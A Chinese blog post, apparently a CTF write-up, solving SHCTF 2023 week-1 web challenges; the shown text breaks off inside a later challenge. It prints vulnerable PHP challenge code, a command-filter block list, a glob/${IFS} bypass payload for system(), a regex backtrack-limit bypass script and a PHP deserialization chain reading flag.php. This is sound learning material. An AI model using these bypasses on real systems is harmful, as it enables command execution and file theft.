<!DOCTYPE html><html lang="en" theme-mode="dark"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>SHCTF 2023-wp | hybcx's blog</title><link rel="icon" type="image/x-icon" href="/favicon.ico"><script>var config = {"root":"/","search":{"preload":false,"activeHolder":"键入以继续","blurHolder":"数据检索","noResult":"无 $0 相关数据"},"code":{"codeInfo":"$0 - $1 行","copy":"code.copy","copyFinish":"code.copyFinish","expand":"code.expand"}}</script><link rel="stylesheet" href="//unpkg.com/@waline/client@v2/dist/waline.css"><script src="//unpkg.com/mermaid@9.2.2/dist/mermaid.min.js"></script><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lightgallery.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-zoom.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-thumbnail.css"><link type="text/css" rel="stylesheet" href="/lib/fontawesome/css/all.min.css"><link rel="stylesheet" href="/css/arknights.css"><script>if (window.localStorage.getItem('theme-mode') === 'light') document.documentElement.setAttribute('theme-mode', 'light')
if (window.localStorage.getItem('theme-mode') === 'dark') document.documentElement.setAttribute('theme-mode', 'dark')</script><style>@font-face {
 font-family: BenderLight;
 src: local('Bender'), url("/font/BenderLight.ttf");
}
@font-face {
 font-family: 'JetBrains Mono';
 src: local('JetBrains Mono'), url('/font/JetBrainsMono-Regular.woff2') format('woff2');
}</style><style>:root {
  --dark-background: url('https://ak.hypergryph.com/assets/index/images/ak/pc/bk.jpg');
  --light-background: url('/img/bk.jpg');
}</style><meta name="generator" content="Hexo 6.3.0"></head><body><div class="loading" style="opacity: 0;"><div class="loadingBar left"></div><div class="loadingBar right"></div></div><main><header class="closed"><nav><div class="navBtn"><i class="navBtnIcon"><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span></i></div><div class="navItem" id="search-header"><span class="navItemTitle"><input autocomplete="off" autocorrect="off" autocapitalize="none" placeholder="数据检索" spellcheck="false" maxlength="50" type="text" id="search-input"></span></div><div class="navItem" id="search-holder"></div><div class="search-popup"><div id="search-result"></div></div><ol class="navContent"><li class="navItem"><a class="navBlock" href="/"><span class="navItemTitle">Home</span></a></li><li class="navItem" matchdata="categories,tags"><a class="navBlock" href="/archives/"><span class="navItemTitle">Archives</span></a></li><li class="navItem"><a class="navBlock" href="/friends/"><span class="navItemTitle">Friends</span></a></li><li class="navItem"><a class="navBlock" href="/about"><span class="navItemTitle">About</span></a></li></ol></nav></header><div id="shadow-header"></div><article><div id="post-bg"><div id="post-title"><h1>SHCTF 2023-wp</h1><div id="post-info"><span>文章发布时间: <div class="control"><time datetime="2023-10-02T08:07:24.234Z" id="date"> 2023-10-02</time></div></span><br><span>最后更新时间: <div class="control"><time datetime="2023-11-19T04:29:44.033Z" id="updated"> 2023-11-19</time></div></span><br><span>文章总字数: <div class="control">9k</div></span><br><span>预计阅读时间: <div class="control">38 分钟</div></span></div></div><hr><div id="post-content"><h1>0x01 前言</h1>
<p>最近新生比赛太多了，一打开全是web题，看着就爽(bushi，做下来之后发现一点都不新生┭┮﹏┭┮，可能是我太菜了。但总体下来感觉每个赛事都还不错，要说最有难度的还是moectf了，很烦。但总体体验下来还是SHCTF舒服，平台绚丽、体验感也贼好等等（反正各种舒服吧），更何况还是&quot;山河CTF&quot;，我就是山河人啊┭┮﹏┭┮。话不多说开始写wp</p>
<h1>0x02 玩转题目</h1>
<p>先从最简单的开始吧</p>
<h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2>
<h3 id="WEEK1-飞机大战"><a href="#WEEK1-飞机大战" class="headerlink" title="WEEK1-飞机大战"></a>[WEEK1]飞机大战</h3>
<p class='item-img' data-src='image-20231002165620335.png'><img src="image-20231002165620335.png" alt="image-20231002165620335"></p>
<p>首先依旧是亲切无比的游戏，我们先点开看看</p>
<p class='item-img' data-src='image-20231002165742671.png'><img src="image-20231002165742671.png" alt="image-20231002165742671"></p>
<p class='item-img' data-src='image-20231002165757359.png'><img src="image-20231002165757359.png" alt="image-20231002165757359"></p>
<p>嗯~~，非常熟悉的嘲讽，那我们按照常规思路直接审计一下相关js代码，进控制台查找</p>
<p class='item-img' data-src='image-20231002165914335.png'><img src="image-20231002165914335.png" alt="image-20231002165914335"></p>
<p>进去的时候看到敏感字符score，那猜测应该是修改score以达到获取flag，我们继续跟踪score</p>
<p class='item-img' data-src='image-20231002170013762.png'><img src="image-20231002170013762.png" alt="image-20231002170013762"></p>
<p>这里是一些对score的判断</p>
<p class='item-img' data-src='image-20231002170048124.png'><img src="image-20231002170048124.png" alt="image-20231002170048124"></p>
<p>看到上图的时候发现是对score达到要求的函数操作，但似乎没有用的信息，于是我墨迹了一会儿想到，游戏失败会弹窗，那成功了大概率也是弹窗。凭借此思路我们可以想到是否可以找到关于&quot;游戏胜利的处理函数&quot;看看内部有什么信息，于是我继续找发现了won函数（类似win：胜利）</p>
<p class='item-img' data-src='image-20231002170252784.png'><img src="image-20231002170252784.png" alt="image-20231002170252784"></p>
<p>如图发现alert弹窗函数，以及uniccode编码字符串，那我们解码一下看看</p>
<p class='item-img' data-src='image-20231002170341536.png'><img src="image-20231002170341536.png" alt="image-20231002170341536"></p>
<p>嗯！亲切的base64，解码即可得到flag</p>
<p class='item-img' data-src='image-20231002170406433.png'><img src="image-20231002170406433.png" alt="image-20231002170406433"></p>
<h3 id="WEEK1-babyRCE"><a href="#WEEK1-babyRCE" class="headerlink" title="WEEK1-babyRCE"></a>[WEEK1]babyRCE</h3>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-variable">$rce</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;rce&#x27;</span>];<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$rce</span>)) &#123;<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/cat|more|less|head|tac|tail|nl|od|vi|vim|sort|flag| |\;|[0-9]|\*|\`|\%|\&gt;|\&lt;|\&#x27;|\&quot;/i&quot;</span>, <span class="hljs-variable">$rce</span>)) &#123;<br>        <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$rce</span>);<br>    &#125;<span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;hhhhhhacker!!!&quot;</span>.<span class="hljs-string">&quot;\n&quot;</span>;<br>    &#125;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure>
<p>很明显的rce嘛，但是过滤了很多，这里我也是比较菜记不住那么多知识点，只是在遇到的时候在网上冲浪找相关payload，于是乎翻到了如下：</p>
<h4 id="中括号匹配绕过"><a href="#中括号匹配绕过" class="headerlink" title="中括号匹配绕过"></a>[]中括号匹配绕过</h4>
<p>例如**[a-c]** 代表匹配 a-b之间的字符,包括a,b字符本身</p>
<p>匹配范围为当前目录，例子如下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">/[a-c][h-j][m-o]/[b-d]a[s-u] flag.txt<br> <br>相当于<br>/bin/cat flag.txt<br> <br>因为[]匹配范围只在当前路径<br>所以要为bin绝对路径<br></code></pre></td></tr></table></figure>
<p>一定要注意绝对路径，相对路径是不可以的！</p>
<p>随后参考上述可以构造如下payload：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">/[a-c][h-j][m-o]/[b-d]a[s-u]$&#123;IFS&#125;/fl?g<br>也就是:/bin/cat flag;?:表示通配字符0或,也就是可以匹配任意一个字符<br>$&#123;IFS&#125;在linux中可以代替空格<br><br>这里选/flag原因是通过构造ls$&#123;IFS&#125;/得到的，只输入ls也会发现flag.php，不过这是假的<br></code></pre></td></tr></table></figure>
<p class='item-img' data-src='image-20231002171434401.png'><img src="image-20231002171434401.png" alt="image-20231002171434401"></p>
<p class='item-img' data-src='image-20231002171456572.png'><img src="image-20231002171456572.png" alt="image-20231002171456572"></p>
<h3 id="WEEK1-登录就给flag"><a href="#WEEK1-登录就给flag" class="headerlink" title="WEEK1-登录就给flag"></a>[WEEK1]登录就给flag</h3>
<p>首页如下，这里只能在登录页面转悠，没什么信息的</p>
<p class='item-img' data-src='image-20231002171556583.png'><img src="image-20231002171556583.png" alt="image-20231002171556583"></p>
<p>当时我想复杂了，先用dirsearch扫了扫，又bp抓包看了看，什么也没发现，最后尝试了万能密码和sql注入均无果，我以为这道题很难的，结果一位师傅告诉我直接弱口令啊，我还纳闷呢，我也试过啊，没这么简单吧。但我又想到我当时只是尝试了一下，随后我又去尝试，发现真的很简单：</p>
<p>直接admin：password就登陆进去了。。。。。。。。</p>
<p class='item-img' data-src='image-20231002171845988.png'><img src="image-20231002171845988.png" alt="image-20231002171845988"></p>
<p class='item-img' data-src='image-20231002171851387.png'><img src="image-20231002171851387.png" alt="image-20231002171851387"></p>
<p>拿到flag</p>
<h3 id="WEEK1-生成你的邀请函吧"><a href="#WEEK1-生成你的邀请函吧" class="headerlink" title="WEEK1-生成你的邀请函吧"></a>[WEEK1]生成你的邀请函吧~</h3>
<p class='item-img' data-src='image-20231002171944121.png'><img src="image-20231002171944121.png" alt="image-20231002171944121"></p>
<p>首页如下，再结合题目给的信息：</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs json">API：url/generate_invitation  <br>Request：POST application/json  <br>Body：<span class="hljs-punctuation">&#123;</span>  <br>    <span class="hljs-attr">&quot;name&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;Yourname&quot;</span><span class="hljs-punctuation">,</span>  <br>    <span class="hljs-attr">&quot;imgurl&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;http://q.qlogo.cn/headimg_dl?dst_uin=QQnumb&amp;spec=640&amp;img_type=jpg&quot;</span>  <br><span class="hljs-punctuation">&#125;</span>  <br><br>使用POST json请求来生成你的邀请函吧~flag就在里面哦~<br></code></pre></td></tr></table></figure>
<p>很显然就是抓包修改为上述格式即可，但这里注意不必放到repeater直接修改后放包即可，不然出来的图片你看不到，只能是一堆乱码</p>
<p class='item-img' data-src='image-20231002172127324.png'><img src="image-20231002172127324.png" alt="image-20231002172127324"></p>
<p>添加指定url后抓包修改</p>
<p class='item-img' data-src='image-20231002172205055.png'><img src="image-20231002172205055.png" alt="image-20231002172205055"></p>
<p>未修改前如上图；修改后如下图：</p>
<p class='item-img' data-src='image-20231002172317260.png'><img src="image-20231002172317260.png" alt="image-20231002172317260"></p>
<p>直接放包即可</p>
<p class='item-img' data-src='image-20231002172359170.png'><img src="image-20231002172359170.png" alt="image-20231002172359170"></p>
<p>放包之后会发现浏览器自动下载了图片 ，访问看到如下图flag，这里我是发到了微信直接利用微信的自带图片提取文字功能，大家有别的办法也可以</p>
<h3 id="WEEK1-1zzphp"><a href="#WEEK1-1zzphp" class="headerlink" title="WEEK1-1zzphp"></a>[WEEK1]1zzphp</h3>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span> <br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-string">&#x27;./index.txt&#x27;</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;c_ode&#x27;</span>]) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;num&#x27;</span>]))<span class="hljs-comment">//判断参数是否存在</span><br>&#123;<br>    <span class="hljs-variable">$code</span> = (String)<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;c_ode&#x27;</span>];<span class="hljs-comment">//强制转换为字符串类型后赋值</span><br>    <span class="hljs-variable">$num</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;num&#x27;</span>];<span class="hljs-comment">//正常赋值</span><br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/[0-9]/&quot;</span>, <span class="hljs-variable">$num</span>))<span class="hljs-comment">//正则匹配</span><br>    &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;no number!&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">elseif</span>(<span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$num</span>))<span class="hljs-comment">//转换为整数类型</span><br>    &#123;<br>      <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/.+?SHCTF/is&#x27;</span>, <span class="hljs-variable">$code</span>))<span class="hljs-comment">//还是正则匹配</span><br>      &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;no touch!&#x27;</span>);<br>      &#125;<br>        <span class="hljs-comment">//找寻code字符串中第一次出现指定字符串的位置</span><br>      <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">stripos</span>(<span class="hljs-variable">$code</span>,<span class="hljs-string">&#x27;2023SHCTF&#x27;</span>) === <span class="hljs-literal">FALSE</span>)<br>      &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;what do you want&#x27;</span>);<br>      &#125;<br>      <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>    &#125;<br>&#125;  <br></code></pre></td></tr></table></figure>
<p>emmm有难度的PHP特性（只怪我刷太少，太菜了┭┮﹏┭┮）</p>
<p>这里也是废了很长时间，最后也是百度找到的思路</p>
<p>首先第一个正则的话，做题多了就知道preg_match函数的特性：不能处理数组类型（会返回false），那我们直接将num赋值为：num[]=1，在之后的intval作用下会转换成1，即可绕过。</p>
<p>第二个呢是正则与stripos的配合绕过，分析得该正则要求你的code参数不能为SHCTF，且SHCTF前面不能有任意字符，但后续的stripos要求你的code参数必须含有2023SHCTF，所以这里花了我很长时间。</p>
<p>在此期间我尝试了数组等等，但均无果，之后网上漫游发现可以利用正则最大回溯绕过。那我们先来学习一下该知识点，先放出参考文章：</p>
<p><a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html#0x01">PHP利用PCRE回溯次数限制绕过某些安全限制 | 离别歌</a></p>
<p>这篇文章很顶，解释的我都能看懂(<em>^▽^</em>)，但由于我概述能力不好，就结合别人的话语来阐释：</p>
<p>​		简单来说就是正则表达式匹配的时候某个.*将后面的字符全部匹配到了，导致表达式后面的式子没有地方匹配，因此一个一个字符吐出来，直到后面的式子全部匹配完毕或者回溯次数过多导致正则直接返回false：当然上述表述的前提下是要求正则表达式处于非贪婪模式或者NFA模式</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">NFA模式：从起始状态开始，一个字符一个字符地读取输入串，并与正则表达式进行匹配，如果匹配不上，则进行回溯，尝试其他状态（所谓的回溯也就是在返回前面的字符串进行重新匹配，直到正则表达式匹配完全），具体可参考上述文章。<br></code></pre></td></tr></table></figure>
<p>非贪婪模式：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/UNION.+?SELECT/is&#x27;</span>, <span class="hljs-variable">$input</span>)) &#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;SQL Injection&#x27;</span>);<br>&#125;<br></code></pre></td></tr></table></figure>
<p>如同上述表达式如果我输入该语句：<code>UNION/*aaaaa*/SELECT</code>，这个正则表达式执行流程如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">.+?匹配到/<br>因为非贪婪模式，所以.+?停止匹配，而由S匹配*<br>S匹配*失败，回溯，再由.+?匹配*<br>因为非贪婪模式，所以.+?停止匹配，而由S匹配a<br>S匹配a失败，回溯，再由.+?匹配a<br>...<br></code></pre></td></tr></table></figure>
<p>回溯次数随着a的数量增加而增加。所以，我们仍然可以通过发送大量a，来使回溯次数超出<code>pcre.backtrack_limit</code>限制，进而绕过WAF：</p>
<p class='item-img' data-src='image-20231002174640233.png'><img src="image-20231002174640233.png" alt="image-20231002174640233"></p>
<p>注意正则匹配中的<code> ^.*、.*$、.</code>*就可以使用回溯，怎么回溯呢，只能上脚本了，因为一百万个字符，总不可能手写。我这里也是问GPT得到的脚本，因为我菜狗不会写┭┮﹏┭┮</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">import</span> requests<br><br><span class="hljs-comment"># 定义目标 URL</span><br>url = <span class="hljs-string">&#x27;http://112.6.51.212:30422/?num[]=1&#x27;</span>  <span class="hljs-comment"># 请将此处的 URL 替换为你要访问的实际 URL</span><br><br><span class="hljs-comment"># POST 请求参数</span><br>prefix_a = <span class="hljs-string">&#x27;a&#x27;</span> * <span class="hljs-number">1000000</span><br>post_params = &#123;<span class="hljs-string">&#x27;c_ode&#x27;</span>: prefix_a + <span class="hljs-string">&#x27;2023SHCTF&#x27;</span>&#125;<br><br><span class="hljs-comment"># 发送 POST 请求并获取响应</span><br>post_response = requests.post(url, data=post_params)<br><br><span class="hljs-comment"># 检查 POST 请求的响应</span><br><span class="hljs-keyword">if</span> post_response.status_code == <span class="hljs-number">200</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;POST 请求成功&quot;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;POST 响应内容:&quot;</span>, post_response.text)<br><span class="hljs-keyword">else</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;POST 请求失败&quot;</span>)<br></code></pre></td></tr></table></figure>
<p>思路就是对该url进行请求，并传入相应的get和post参数，但在2023SHCTF之前要加入一百万个字符a，即可绕过</p>
<p class='item-img' data-src='image-20231002174921001.png'><img src="image-20231002174921001.png" alt="image-20231002174921001"></p>
<p>成功拿到flag</p>
<h3 id="WEEK1-ez-serialize"><a href="#WEEK1-ez-serialize" class="headerlink" title="WEEK1-ez-serialize"></a>[WEEK1]ez_serialize</h3>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<span class="hljs-comment">//高亮代码</span><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">A</span></span>&#123;<br>  <span class="hljs-keyword">public</span> <span class="hljs-variable">$var_1</span>;<br>  <br>  <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span>&#123;<span class="hljs-comment">//需要当对象被当成一个方法(也就是函数)调用时,invoke会自动调用</span><br>   <span class="hljs-keyword">include</span>(<span class="hljs-variable language_">$this</span>-&gt;var_1);<span class="hljs-comment">//这里一看就知道是敏感函数，大概是用来伪协议读取的</span><br>  &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">B</span></span>&#123;<br>  <span class="hljs-keyword">public</span> <span class="hljs-variable">$q</span>;<br>  <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)//当开始反序列化的时候，<span class="hljs-title">wakeup</span>会被自动调用</span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/gopher|http|file|ftp|https|dict|\.\./i&quot;</span>, <span class="hljs-variable">$this</span>-&gt;q)) &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;hacker&quot;</span>;           <br>        &#125;<span class="hljs-comment">//虽然这里的正则过滤的很多，但没啥用，可以忽略</span><br>&#125;<br><br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">C</span></span>&#123;<br>  <span class="hljs-keyword">public</span> <span class="hljs-variable">$var</span>;<br>  <span class="hljs-keyword">public</span> <span class="hljs-variable">$z</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span>&#123;<span class="hljs-comment">//当一个类被当做字符串使用时，会自动调用</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;z-&gt;<span class="hljs-keyword">var</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">D</span></span>&#123;<br>  <span class="hljs-keyword">public</span> <span class="hljs-variable">$p</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$key</span></span>)</span>&#123;<span class="hljs-comment">//当读取不可访问的属性的值时调用</span><br>        <span class="hljs-variable">$function</span> = <span class="hljs-variable language_">$this</span>-&gt;p;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$function</span>();<br>    &#125;  <br>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;payload&#x27;</span>]))<span class="hljs-comment">//简单的传参</span><br>&#123;<br>    <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;payload&#x27;</span>]);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
<p>很简单的序列化题，结合上述对代码的分析我们可以构造如下链子：</p>
<p>首先看准敏感函数include，这里肯定是用来读取php文件的，那这个函数肯定是我们的目标，那么我们想要调用invoke，就需要A对象被当做一个函数去调用，那我们可以找到D类中的<code>return $function();</code>符合我们的要求。</p>
<p>那想要调用其所在的get函数，就需要读取一个不可访问的属性，那我们又可以看到<code>return $this-&gt;z-&gt;var;</code>很明显如果我们令z指向对象D，那z-&gt;var相当于D-&gt;var，但很显然D中没有var属性，那便成功调用get函数了。</p>
<p>那我们想要调用其所在的tostring函数，就需要当一个类被当做字符串时会调用，那我们又可以发现wakeup里面的正则匹配，其中<code>$this-&gt;q</code>被认作字符串，那完全可以将q赋值为C类，即可走通链子。</p>
<p>至于wakeup的调用，反序列化的时候就会被自动调用，我们不必考虑。那么poc如下：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">//highlight_file(__FILE__);</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">A</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$var_1</span>;<br><br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">B</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$q</span>;<br><br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">C</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$var</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$z</span>;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">D</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$p</span>;<br>&#125;<br><span class="hljs-variable">$poc</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">B</span>();<br><span class="hljs-variable">$poc</span>-&gt;q = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">C</span>();<br><span class="hljs-variable">$poc</span>-&gt;q-&gt;z=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">D</span>();<br><span class="hljs-variable">$poc</span>-&gt;q-&gt;z-&gt;p=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">A</span>();<br><span class="hljs-variable">$poc</span>-&gt;q-&gt;z-&gt;p-&gt;var_1=<span class="hljs-string">&#x27;php://filter/convert.base64-encode/resource=flag.php&#x27;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$poc</span>));<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
<p class='item-img' data-src='image-20231002180702598.png'><img src="image-20231002180702598.png" alt="image-20231002180702598"></p>
<p class='item-img' data-src='image-20231002180723398.png'><img src="image-20231002180723398.png" alt="image-20231002180723398"></p>
<p>直接base64解码即可</p>
<p class='item-img' data-src='image-20231002180737123.png'><img src="image-20231002180737123.png" alt="image-20231002180737123"></p>
<p>得到flag</p>
<h3 id="WEEK1-ezphp"><a href="#WEEK1-ezphp" class="headerlink" title="WEEK1-ezphp"></a>[WEEK1]ezphp</h3>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;code&#x27;</span>]) &amp;&amp; <span class="hljs-keyword">isset</span>(<span 